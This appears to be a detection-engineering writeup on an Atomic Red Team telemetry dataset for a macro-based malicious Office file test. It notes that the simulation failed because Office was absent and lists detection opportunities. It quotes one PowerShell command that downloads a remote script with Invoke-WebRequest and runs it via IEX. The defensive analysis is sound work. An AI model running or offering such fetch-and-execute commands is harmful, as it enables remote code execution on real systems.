# T1204.002-5: Malicious File — Office launching .bat file from AppData

## Technique Context

T1204.002 (Malicious File) represents user execution of malicious files, a critical initial access and execution technique where attackers rely on social engineering to trick users into opening weaponized documents. This specific test simulates a common attack vector where Microsoft Office documents contain macros that create and execute batch files from temporary directories. The technique is foundational to many phishing campaigns and represents the moment when user interaction enables malicious code execution.

Detection engineers focus heavily on this technique because it sits at the intersection of legitimate user behavior and malicious activity. Key detection opportunities include macro execution, file creation in temporary directories, process spawning from Office applications, and suspicious command-line patterns. The technique often serves as the entry point for multi-stage attacks, making early detection crucial.

## What This Dataset Contains

This dataset captures a PowerShell-based simulation that attempts to create a malicious Office document with VBA macros. The key events show:

**PowerShell execution attempting Office automation:**
- Security 4688 shows the child PowerShell process with command line: `"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)`
- PowerShell 4103 shows `Invoke-WebRequest` downloading the Invoke-MalDoc script from GitHub
- PowerShell 4104 contains the full Invoke-MalDoc function source code that would create Office documents with VBA macros

**Failed Office COM automation:**
- PowerShell 4100 error: "Retrieving the COM class factory for component with CLSID {00000000-0000-0000-0000-000000000000} failed due to the following error: 80040154 Class not registered"
- PowerShell 4103 shows `New-Object -ComObject "Word.Application"` failing due to missing Office installation

**Network activity:**
- Sysmon 22 DNS query for `raw.githubusercontent.com` resolved to GitHub's IP addresses
- Sysmon 7 shows `urlmon.dll` loading into PowerShell, indicating web request activity

**Process telemetry:**
- Sysmon 1 captures `whoami.exe` execution during the test setup
- Multiple Sysmon 7 events show .NET runtime and PowerShell DLL loading

## What This Dataset Does Not Contain

The core technique simulation fails because Microsoft Office is not installed on the test system. This means the dataset lacks:

- **Office process creation** - No WINWORD.EXE, EXCEL.EXE, or other Office processes
- **VBA macro execution telemetry** - No macro-related process spawning or file operations
- **Batch file creation** - The intended `art1204.bat` file is never created in `%TEMP%`
- **Calculator execution** - The macro payload (`calc.exe`) never executes
- **Office-specific registry modifications** - No VBA security setting changes in Office registry keys
- **Document creation events** - No malicious .doc or .docx files created

The PowerShell errors show attempts to modify Office security settings (`AccessVBOM` registry value) but these fail because the registry paths don't exist without Office installed. The test demonstrates the download and preparation phases but not the actual malicious file execution that defines T1204.002.

## Assessment

This dataset provides limited value for T1204.002 detection engineering due to the failed Office automation. However, it offers excellent telemetry for the preparatory phases of macro-based attacks:

**Strong coverage for:**
- PowerShell-based payload staging and delivery
- Network-based script download patterns
- COM object instantiation attempts
- Failed Office automation detection

**Weak coverage for:**
- Actual malicious file execution behavior
- Office macro telemetry
- User interaction simulation
- Multi-stage payload delivery

The dataset is more valuable for detecting T1059.001 (PowerShell) and T1105 (Ingress Tool Transfer) than the intended T1204.002. For comprehensive T1204.002 detection development, you would need datasets captured on systems with Office installed where the macro execution succeeds.

## Detection Opportunities Present in This Data

1. **PowerShell downloading external scripts via Invoke-WebRequest** - Security 4688 command lines and PowerShell 4103 events showing downloads from raw.githubusercontent.com

2. **COM object instantiation failures for Office applications** - PowerShell 4100 errors with CLSID 00000000-0000-0000-0000-000000000000 and specific error code 0x80040154

3. **Macro payload staging patterns** - PowerShell 4104 script blocks containing VBA code templates with file creation and shell execution patterns

4. **GitHub raw content downloads** - Sysmon 22 DNS queries for raw.githubusercontent.com combined with urlmon.dll loading

5. **Registry modification attempts for Office VBA settings** - PowerShell 4103 events showing Test-Path, New-Item, and Set-ItemProperty operations on Office security registry keys

6. **PowerShell execution with embedded escape characters** - Command lines containing complex quoting and escape sequences typical of encoded payloads

7. **Atomic Red Team artifact patterns** - File paths and variable names containing "art1204" and references to specific ART test frameworks
